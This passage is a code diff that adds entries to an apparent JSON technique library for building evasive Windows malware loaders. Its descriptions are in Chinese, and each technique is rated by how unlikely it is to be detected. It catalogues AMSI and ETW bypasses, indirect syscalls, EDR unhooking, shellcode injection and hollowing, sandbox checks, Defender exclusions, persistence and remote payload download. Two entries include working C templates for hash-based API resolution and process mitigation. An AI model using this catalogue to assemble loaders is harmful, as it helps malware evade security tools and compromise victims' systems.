+      "code_template": "// Get module base from PEB\nPVOID GetModuleFromPEB(LPCWSTR moduleName) {\n    PPEB peb = (PPEB)__readgsqword(0x60);\n    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;\n    PLIST_ENTRY curr = head->Flink;\n    \n    do {\n        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n        if (entry->BaseDllName.Buffer) {\n            if (_wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0) {\n                return entry->DllBase;\n            }\n        }\n        curr = curr->Flink;\n    } while (curr != head);\n    \n    return NULL;\n}\n\n// Get export by hash\nPVOID GetExportByHash(PVOID moduleBase, DWORD hash) {\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + ((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);\n    \n    DWORD* names = (DWORD*)((BYTE*)moduleBase + exports->AddressOfNames);\n    WORD* ords = (WORD*)((BYTE*)moduleBase + exports->AddressOfNameOrdinals);\n    DWORD* funcs = (DWORD*)((BYTE*)moduleBase + exports->AddressOfFunctions);\n    \n    for (DWORD i = 0; i < exports->NumberOfNames; i++) {\n        char* name = (char*)((BYTE*)moduleBase + names[i]);\n        if (HashString(name) == hash) {\n            return (BYTE*)moduleBase + funcs[ords[i]];\n        }\n    }\n    return NULL;\n}",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T030",
+      "name": "ACG (Arbitrary Code Guard)",
+      "type": "execution_evasion",
+      "description": "启用ACG策略防止动态代码修改",
+      "complexity": "simple",
+      "source": "reveng007/DarkWidow",
+      "apis": [
+        "SetProcessMitigationPolicy"
+      ],
+      "code_template": "// Enable ACG for current process\nPROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };\npolicy.ProhibitDynamicCode = 1;\nSetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy));\n\n// Now VirtualAlloc with PAGE_EXECUTE_READWRITE will fail\n// Only allow RW then RX transitions",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "name": "Reflective DLL Injection",
+      "evasion_type": "execution_evasion",
+      "description": "从内存中加载DLL，无需通过LoadLibrary，避免文件落地",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "VirtualAlloc",
+        "GetProcAddress",
+        "LoadLibrary",
+        "NT_HEADER"
+      ],
+      "references": [
+        "https://github.com/stephenfewer/ReflectiveDLLInjection"
+      ],
+      "id": "T031",
+      "created_at": "2026-03-05T19:50:32.345700",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "COFF/BOF Loader",
+      "evasion_type": "execution_evasion",
+      "description": "在内存中加载和执行COFF文件和Cobalt Strike BOF，无需文件落地",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "GetProcAddress",
+        "LoadLibrary",
+        "VirtualAlloc"
+      ],
+      "references": [
+        "https://github.com/hakaioffsec/coffee",
+        "https://github.com/trustedsec/COFFLoader"
+      ],
+      "id": "T032",
+      "created_at": "2026-03-05T19:50:35.940521",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Patchless AMSI Bypass",
+      "evasion_type": "amsi_etw_bypass",
+      "description": "使用硬件断点和VEH异常处理器绕过AMSI，无需修改内存中的AMSI代码",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "AddVectoredExceptionHandler",
+        "SetThreadContext",
+        "GetThreadContext"
+      ],
+      "references": [
+        "https://github.com/VoldeSec/PatchlessCLRLoader",
+        "https://github.com/EvilBytecode/Ebyte-amsi-patchless-vehhwbp"
+      ],
+      "id": "T033",
+      "created_at": "2026-03-05T19:50:39.797233",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Alternative Callback Execution",
+      "evasion_type": "execution_evasion",
+      "description": "通过Windows各种回调函数执行shellcode，避免使用CreateThread等常见API",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "CertEnumSystemStore",
+        "CertEnumSystemStoreLocation",
+        "EnumCalendarInfo",
+        "EnumDisplayMonitors",
+        "EnumFontFamilies",
+        "CopyFileEx",
+        "CreateTimerQueueTimer"
+      ],
+      "references": [
+        "https://github.com/aahmad097/AlternativeShellcodeExec"
+      ],
+      "id": "T034",
+      "created_at": "2026-03-05T19:50:43.322573",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Donut PE Loader",
+      "evasion_type": "execution_evasion",
+      "description": "将.NET程序集、PE文件转换为位置无关的shellcode，从内存加载执行",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "VirtualAlloc",
+        "CLRCreateInstance",
+        "MetaDataDispenser"
+      ],
+      "references": [
+        "https://github.com/TheWover/donut"
+      ],
+      "id": "T035",
+      "created_at": "2026-03-05T19:50:47.407752",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Module Stomping",
+      "evasion_type": "execution_evasion",
+      "description": "将shellcode写入已加载模块的代码段，避免分配新的可执行内存区域",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "LoadLibrary",
+        "VirtualProtect",
+        "VirtualQuery"
+      ],
+      "references": [
+        "https://github.com/naksyn/ModuleShifting",
+        "https://github.com/SaadAhla/D1rkInject"
+      ],
+      "id": "T036",
+      "created_at": "2026-03-05T19:51:14.872469",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Named Pipe Impersonation",
+      "evasion_type": "execution_evasion",
+      "description": "通过命名管道模拟客户端身份，获取提升的权限",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "CreateNamedPipe",
+        "ConnectNamedPipe",
+        "ImpersonateNamedPipeClient",
+        "RevertToSelf"
+      ],
+      "references": [
+        "https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH",
+        "https://github.com/rxwx/spoolsystem"
+      ],
+      "id": "T037",
+      "created_at": "2026-03-05T19:51:18.807422",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Section Mapping Injection",
+      "evasion_type": "execution_evasion",
+      "description": "使用内存映射文件在进程间共享shellcode，避免使用WriteProcessMemory",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "NtCreateSection",
+        "NtMapViewOfSection",
+        "NtUnmapViewOfSection"
+      ],
+      "references": [
+        "https://github.com/apokryptein/secinject"
+      ],
+      "id": "T038",
+      "created_at": "2026-03-05T19:51:48.116904",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Position Independent Code (PIC)",
+      "evasion_type": "string_obfuscation",
+      "description": "编写位置无关代码，避免使用全局变量和固定地址，可在任意内存位置执行",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "references": [
+        "https://github.com/tijme/relocatable"
+      ],
+      "id": "T039",
+      "created_at": "2026-03-05T19:52:20.153614",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Indirect Clean Syscalls (HellHall)",
+      "evasion_type": "execution_evasion",
+      "description": "通过HellHall技术实现间接干净系统调用，从hooked函数中提取SSN并跳转到NTDLL中的syscall指令",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory"
+      ],
+      "references": [
+        "https://github.com/Maldev-Academy/HellHall"
+      ],
+      "id": "T040",
+      "created_at": "2026-03-05T19:53:00.756951",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "FreshyCalls",
+      "evasion_type": "execution_evasion",
+      "description": "现代C++17风格的syscall库，无需太多样板代码即可舒适使用系统调用",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "references": [
+        "https://github.com/crummie5/FreshyCalls"
+      ],
+      "id": "T041",
+      "created_at": "2026-03-05T19:53:08.654629",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Selective Syscall Unhooking",
+      "evasion_type": "unhooking",
+      "description": "选择性取消ntdll.dll的用户态hook，从已知干净的系统调用号重建系统调用",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtQueryInformationFile",
+        "NtReadFile",
+        "VirtualProtect"
+      ],
+      "references": [
+        "https://github.com/S12cybersecurity/NtUnhook"
+      ],
+      "id": "T042",
+      "created_at": "2026-03-05T19:53:20.653096",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Transacted Hollowing",
+      "evasion_type": "execution_evasion",
+      "description": "进程镂空变种，结合NTFS事务和进程镂空技术，避免RWX内存权限",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtCreateTransaction",
+        "NtCreateSection",
+        "NtCreateProcessEx",
+        "NtRollbackTransaction"
+      ],
+      "references": [
+        "https://github.com/hasherezade/transacted_hollowing"
+      ],
+      "id": "T043",
+      "created_at": "2026-03-05T19:54:06.965366",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Polymorphic Shellcode",
+      "evasion_type": "string_obfuscation",
+      "description": "变形引擎生成多态shellcode，每次编译产生不同的机器码但功能相同，绕过签名检测",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "references": [
+        "https://github.com/tijme/dittobytes",
+        "https://github.com/gum3t/chameleon"
+      ],
+      "id": "T044",
+      "created_at": "2026-03-05T19:54:25.553496",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "ThreadPool Callstack Spoofing",
+      "evasion_type": "execution_evasion",
+      "description": "使用Windows线程池(Thread Pool)隐藏调用栈，结合间接系统调用避免EDR检测。通过tpWorker回调执行，使调用栈看起来来自ntdll.dll内部",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateThreadpoolWait",
+        "SetThreadpoolWait",
+        "WaitForThreadpoolWaitCallbacks"
+      ],
+      "references": [
+        "https://github.com/pard0p/CallstackSpoofingPOC"
+      ],
+      "id": "T045",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: pard0p/CallstackSpoofingPOC"
+    },
+    {
+      "name": "Hell's Gate + Halo's Gate SSN Resolution",
+      "evasion_type": "execution_evasion",
+      "description": "动态从NTDLL解析系统调用号(SSN)，通过Hell's Gate和Halo's Gate技术绕过EDR Hook。当函数被Hook时(JMP指令)，通过遍历邻近系统调用计算目标SSN",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [],
+      "references": [
+        "https://github.com/JetP1ane/Artemis",
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T046",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: JetP1ane/Artemis, voidvxvi/HellBunny"
+    },
+    {
+      "name": "AES-256-CTR / XChaCha20 Shellcode Encryption",
+      "evasion_type": "string_obfuscation",
+      "description": "使用AES-256-CTR或XChaCha20等现代加密算法加密shellcode，提供更强的安全性",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T047",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "IAT Camouflage",
+      "evasion_type": "api_obfuscation",
+      "description": "伪装导入地址表(IAT)，使其看起来像正常程序，隐藏真实使用的API",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T048",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "String Hashing (CRC32B/FNV1A32B/DJB2)",
+      "evasion_type": "string_obfuscation",
+      "description": "使用CRC32B、FNV1A32B或DJB2等哈希算法隐藏字符串，避免静态分析",
+      "complexity": "simple",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T049",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "XLL/DLL Multi-Format Build",
+      "evasion_type": "execution_evasion",
+      "description": "加载器可编译为EXE、DLL或XLL格式，支持DLL侧加载攻击和多种部署方式",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T050",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "Remote Shellcode Download",
+      "evasion_type": "string_obfuscation",
+      "description": "从远程服务器下载shellcode，避免静态检测。使用WinINet API下载payload到内存",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "InternetOpenA",
+        "InternetConnectA",
+        "HttpOpenRequestA",
+        "HttpSendRequestA",
+        "InternetReadFile"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader",
+        "https://github.com/tehstoni/tryharder"
+      ],
+      "id": "T051",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader, tehstoni/tryharder"
+    },
+    {
+      "name": "Process Count Sandbox Check",
+      "evasion_type": "anti_analysis",
+      "description": "检查运行的进程数量，如果少于阈值(如100个)则可能为沙箱环境",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateToolhelp32Snapshot",
+        "Process32First",
+        "Process32Next"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T052",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "ETW Patching",
+      "evasion_type": "amsi_etw_bypass",
+      "description": "禁用ETW事件跟踪，修补EtwEventWrite函数返回，防止遥测数据收集",
+      "complexity": "simple",
+      "detection_risk": "medium",
+      "apis": [
+        "VirtualProtect",
+        "GetProcAddress"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T053",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "Tickcount Sandbox Detection",
+      "evasion_type": "anti_analysis",
+      "description": "检查Sleep函数是否被沙箱操纵，通过比较实际睡眠时间与系统滴答计数来检测时间加速",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [
+        "GetTickCount64",
+        "Sleep"
+      ],
+      "references": [
+        "https://github.com/N3agu/Akame-Loader"
+      ],
+      "id": "T054",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: N3agu/Akame-Loader"
+    },
+    {
+      "name": "Hard Disk Size Check",
+      "evasion_type": "anti_analysis",
+      "description": "检查硬盘大小，如果小于阈值(如100GB)则可能为虚拟机或沙箱环境",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [
+        "GetDiskFreeSpaceExA"
+      ],
+      "references": [
+        "https://github.com/N3agu/Akame-Loader"
+      ],
+      "id": "T055",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: N3agu/Akame-Loader"
+    },
+    {
+      "name": "Self-Destruct / Melt",
+      "evasion_type": "execution_evasion",
+      "description": "执行后自删除，减少磁盘痕迹。可通过MoveFileEx标记删除或直接删除文件",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [
+        "MoveFileExA",
+        "DeleteFileA"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T056",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "Mutex Instance Check",
+      "evasion_type": "execution_evasion",
+      "description": "使用互斥体确保只有一个实例运行，避免多次执行被发现",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateMutexA",
+        "OpenMutex"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T057",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "Windows Defender Exclusion",
+      "evasion_type": "amsi_etw_bypass",
+      "description": "添加Windows Defender排除路径，需要管理员权限",
+      "complexity": "medium",
+      "detection_risk": "high",
+      "apis": [
+        "Add-MpPreference"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T058",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "Persistence via Scheduled Task",
+      "evasion_type": "execution_evasion",
+      "description": "通过计划任务实现持久化，在系统启动时自动执行",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "Register-ScheduledTask"
+      ],
+      "references": [
+        "https://github.com/chainski/PandaLoader"
+      ],
+      "id": "T059",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: chainski/PandaLoader"
+    },
+    {
+      "name": "Deferred Execution (Defer)",
+      "evasion_type": "anti_analysis",
+      "description": "使用延迟执行技术绕过沙箱的时间限制，沙箱通常只运行程序短时间",
+      "complexity": "simple",
+      "detection_risk": "very_low",
+      "apis": [],
+      "references": [
+        "https://github.com/G73st/BypassAV"
+      ],
+      "id": "T060",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: G73st/BypassAV"
+    },
+    {
+      "name": "Extended Callback Execution List",
+      "evasion_type": "execution_evasion",
+      "description": "扩展的回调执行方法列表，包括CertEnumSystemStore、CopyFile2、CreateTimerQueueTimer、CryptEnumOIDInfo、EnumCalendarInfo、EnumDisplayMonitors、EnumFontFamilies、FlsAlloc、ImageGetDigestStream等30+种回调方法",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "CertEnumSystemStore",
+        "CertEnumSystemStoreLocation",
+        "CopyFile2",
+        "CopyFileEx",
+        "CreateThreadPoolWait",
+        "CreateTimerQueueTimer",
+        "CryptEnumOIDInfo",
+        "EnumCalendarInfo",
+        "EnumCalendarInfoEx",
+        "EnumChildWindows",
+        "EnumDesktopW",
+        "EnumDesktopWindows",
+        "EnumDirTreeW",
+        "EnumDisplayMonitors",
+        "EnumFontFamiliesExW",
+        "EnumFontFamiliesW",
+        "EnumFontsW",
+        "EnumICMProfiles",
+        "EnumLanguageGroupLocalesW",
+        "EnumObjects",
+        "EnumPageFilesW",
+        "EnumPropsEx",
+        "EnumPropsW",
+        "EnumPwrSchemes",
+        "EnumResourceTypesExW",
+        "EnumResourceTypesW",
+        "EnumSystemLocales",
+        "EnumThreadWindows",
+        "EnumTimeFormatsEx",
+        "EnumUILanguagesW",
+        "EnumWindowStationsW",
+        "EnumWindows",
+        "EnumerateLoadedModules",
+        "FlsAlloc",
+        "ImageGetDigestStream",
+        "ImmEnumInputContext",
+        "InitOnceExecuteOnce",
+        "LdrEnumerateLoadedModules",
+        "OpenThreadWaitChainSession",
+        "SetTimer",
+        "SetupCommitFileQueueW",
+        "SymEnumProcesses",
+        "SymFindFileInPath",
+        "SysEnumSourceFiles"
+      ],
+      "references": [
+        "https://github.com/aahmad097/AlternativeShellcodeExec"
+      ],
+      "id": "T061",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: aahmad097/AlternativeShellcodeExec"
+    },
+    {
+      "name": "CRT Independence",
+      "evasion_type": "string_obfuscation",
+      "description": "不依赖C运行时库(CRT)，减少导入和文件大小，提高隐蔽性",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T062",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "Commandline Argument Erasure",
+      "evasion_type": "execution_evasion",
+      "description": "清除命令行参数，避免分析工具查看执行参数。当通过rundll32执行时特别有用",
+      "complexity": "simple",
+      "detection_risk": "low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T063",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "Indirect Syscall via win32u.dll",
+      "evasion_type": "execution_evasion",
+      "description": "通过win32u.dll执行间接系统调用，比ntdll.dll更隐蔽，因为EDR更少监控win32u.dll",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtGdi*, NtUser*"
+      ],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T064",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "JMP Opcode Hook Detection",
+      "evasion_type": "anti_analysis",
+      "description": "检测函数是否被Hook，通过检查函数开头的JMP指令(E8/E9)来判断是否被EDR Hook",
+      "complexity": "medium",
+      "detection_risk": "very_low",
+      "apis": [],
+      "references": [
+        "https://github.com/voidvxvi/HellBunny"
+      ],
+      "id": "T065",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: voidvxvi/HellBunny"
+    },
+    {
+      "name": "Threadless Inject + Module Stomping",
+      "evasion_type": "execution_evasion",
+      "description": "无线程注入技术结合模块覆盖，加载模块到目标进程并覆盖其代码段，然后恢复内存保护和原始状态",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "LoadLibrary",
+        "VirtualProtect",
+        "VirtualQuery"
+      ],
+      "references": [
+        "https://github.com/SaadAhla/D1rkInject"
+      ],
+      "id": "T066",
+      "created_at": "2026-03-06T12:00:00.000000",
+      "category": "evasion",
+      "source": "github: SaadAhla/D1rkInject"
+    }
+  ]
+}
